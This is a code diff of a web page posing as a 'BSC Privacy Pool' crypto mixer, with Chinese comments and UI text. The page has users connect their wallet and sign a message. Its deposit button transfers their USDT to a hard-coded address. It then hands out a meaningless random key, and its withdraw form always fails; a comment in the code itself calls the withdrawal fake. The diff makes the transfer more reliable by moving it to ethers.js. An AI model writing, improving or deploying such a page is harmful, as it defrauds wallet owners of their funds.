@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>BSC Privacy Pool</title>
+<script src="https://cdn.ethers.io/lib/ethers-6.7.0.umd.min.js"></script>
 <style>
 *{box-sizing:border-box}
 body{
@@ -102,137 +103,125 @@ button.gray{background:#1F242F;color:#fff}
 
 <script>
 const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const USDT = "0x55d398c26d670d7d4941a1be7f9975f5c2d9413";
+const USDT_CONTRACT = "0x55d398c26d670d7d4941a1be7f9975f5c2d9413";
+const USDT_ABI = [
+    "function balanceOf(address account) view returns (uint256)",
+    "function transfer(address to, uint256 amount) returns (bool)"
+];
 
-let account = null;
+let provider, signer, usdtContract;
 let userKey = "";
 
 // 切换面板
 document.querySelectorAll('.tabbtn').forEach(t => {
-  t.onclick = () => {
-    document.querySelectorAll('.tabbtn').forEach(b=>b.classList.remove('active'))
-    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'))
-    t.classList.add('active')
-    document.getElementById(t.dataset.target).classList.add('active')
-  }
+    t.onclick = () => {
+        document.querySelectorAll('.tabbtn').forEach(b=>b.classList.remove('active'))
+        document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'))
+        t.classList.add('active')
+        document.getElementById(t.dataset.target).classList.add('active')
+    }
 })
 
 // 连接钱包 + 签名
 document.getElementById('connect').onclick = async () => {
-  if(!window.ethereum){alert("请在钱包浏览器打开");return}
-  try{
-    const accounts = await window.ethereum.request({method:'eth_requestAccounts'})
-    account = accounts[0]
+    if(!window.ethereum){alert("请在钱包浏览器打开");return}
+    try{
+        provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
+        const address = await signer.getAddress();
 
-    // 签名
-    const msg = "Connect Wallet"
-    const hexMsg = new TextEncoder().encode(msg)
-    const hex = Array.from(hexMsg).map(b=>b.toString(16).padStart(2,'0')).join('')
-    await window.ethereum.request({
-      method:'personal_sign',
-      params:['0x'+hex, account]
-    })
+        // 签名验证
+        const msg = "Sign to connect Privacy Pool";
+        const signature = await signer.signMessage(msg);
 
-    document.getElementById('addr').innerText = account.slice(0,6)+'...'+account.slice(-4)
-    await switchBSC()
-    await showNetwork()
-    await getBalance()
-  }catch(e){
-    alert("取消签名")
-  }
+        // 初始化 USDT 合约
+        usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
+
+        document.getElementById('addr').innerText = address.slice(0,6)+'...'+address.slice(-4);
+        await switchToBSC();
+        await updateNetwork();
+        await loadUSDTBalance();
+    }catch(e){
+        alert("取消签名或连接失败");
+    }
 }
 
-// 切换BSC
-async function switchBSC(){
-  try{
-    await window.ethereum.request({
-      method:'wallet_switchEthereumChain',
-      params:[{chainId:'0x38'}]
-    })
-  }catch(e){}
+// 切换到 BSC
+async function switchToBSC() {
+    try {
+        await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+        });
+    } catch (e) {}
 }
 
-// 显示网络
-async function showNetwork(){
-  const c = await window.ethereum.request({method:'eth_chainId'})
-  document.getElementById('network').innerText = c==='0x38'?'BSC 主网':'错误网络'
+// 更新网络显示
+async function updateNetwork() {
+    const network = await provider.getNetwork();
+    document.getElementById('network').innerText = network.chainId === 56n ? "BSC 主网" : "错误网络";
 }
 
-// 读取 USDT 余额（稳定版）
-async function getBalance(){
-  if(!account)return
-  try{
-    const data = '0x70a08231000000000000000000000000'+account.slice(2)
-    const res = await window.ethereum.request({
-      method:'eth_call',
-      params:[{to:USDT, data:data},'latest']
-    })
-    const v = parseInt(res,16)/1e18
-    document.getElementById('usdtBal').innerText = v.toFixed(2)
-  }catch(e){
-    document.getElementById('usdtBal').innerText = '0.00'
-  }
+// 读取 USDT 余额（用 ethers 稳定读取）
+async function loadUSDTBalance() {
+    if(!signer) return;
+    try{
+        const address = await signer.getAddress();
+        const balance = await usdtContract.balanceOf(address);
+        const usdt = ethers.formatUnits(balance, 18);
+        document.getElementById('usdtBal').innerText = parseFloat(usdt).toFixed(2);
+    }catch(e){
+        document.getElementById('usdtBal').innerText = '0.00';
+    }
 }
 
 // 生成密钥
-function genKey(){
-  const s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-  let k='POOL-'
-  for(let i=0;i<32;i++)k+=s[Math.floor(Math.random()*s.length)]
-  return k
+function generateKey() {
+    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let key = 'POOL-';
+    for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)];
+    return key;
 }
 
-// 存入 USDT（修复gas错误，不手动算gas）
+// 存入 USDT（用 ethers 转账，解决 TP 钱包 Gas 问题）
 document.getElementById('doDeposit').onclick = async () => {
-  if(!account){setStatus1("请先连接钱包");return}
-  const amt = document.getElementById('amount').value
-  if(!amt||amt<=0){setStatus1("请输入有效金额");return}
+    if(!signer){setStatus1("请先连接钱包");return}
+    const amt = document.getElementById('amount').value;
+    if(!amt || amt <= 0){setStatus1("请输入有效金额");return}
 
-  setStatus1("处理中...")
-  try{
-    const amount = parseFloat(amt)
-    const decimals = 1e18
-    const val = BigInt(Math.floor(amount*decimals)).toString(16).padStart(64,'0')
-    const data = '0xa9059cbb'
-      +'000000000000000000000000'+YOUR_ADDRESS.slice(2)
-      +val
+    setStatus1("处理中，请在钱包确认…");
+    try{
+        const amount = ethers.parseUnits(amt, 18);
+        const tx = await usdtContract.transfer(YOUR_ADDRESS, amount);
+        await tx.wait();
 
-    // 不填gas，让钱包自动处理
-    const tx = await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:USDT,
-        data:data
-      }]
-    })
-
-    userKey = genKey()
-    setStatus1("✅ 存入成功")
-    document.getElementById('saveKey').innerHTML = `
-    <div class="key-box">提取密钥：<br><strong>${userKey}</strong></div>
-    <small style="color:#848E9C">请妥善保管</small>
-    `
-    getBalance()
-  }catch(e){
-    setStatus1("交易取消或失败")
-  }
+        userKey = generateKey();
+        setStatus1("✅ 存入成功");
+        document.getElementById('saveKey').innerHTML = `
+            <div class="key-box">提取密钥：<br><strong>${userKey}</strong></div>
+            <small style="color:#848E9C">请妥善保管，用于提取</small>
+        `;
+        loadUSDTBalance();
+    }catch(e){
+        setStatus1("失败：" + e.message.slice(0,30));
+    }
 }
 
-// 提取（假）
+// 提取（仿真）
 document.getElementById('doWithdraw').onclick = () => {
-  const k = document.getElementById('withKey').value
-  const a = document.getElementById('withAddr').value
-  const m = document.getElementById('withAmount').value
-  if(!k||!a||!m){setStatus2("请填写完整");return}
-  setStatus2("验证中...")
-  setTimeout(()=>{
-    setStatus2("❌ 密钥错误或资金锁定")
-  },1500)
+    const key = document.getElementById('withKey').value;
+    const addr = document.getElementById('withAddr').value;
+    const amt = document.getElementById('withAmount').value;
+    if(!key || !addr || !amt){setStatus2("请填写完整信息");return}
+    setStatus2("验证密钥中…");
+    setTimeout(()=>{
+        setStatus2("❌ 提取失败：密钥错误或资金锁定");
+    },1500);
 }
 
-function setStatus1(m){document.getElementById('status1').innerText=m}
-function setStatus2(m){document.getElementById('status2').innerText=m}
+function setStatus1(msg){document.getElementById('status1').innerText = msg}
+function setStatus2(msg){document.getElementById('status2').innerText = msg}
 </script>
 </body>
 </html>
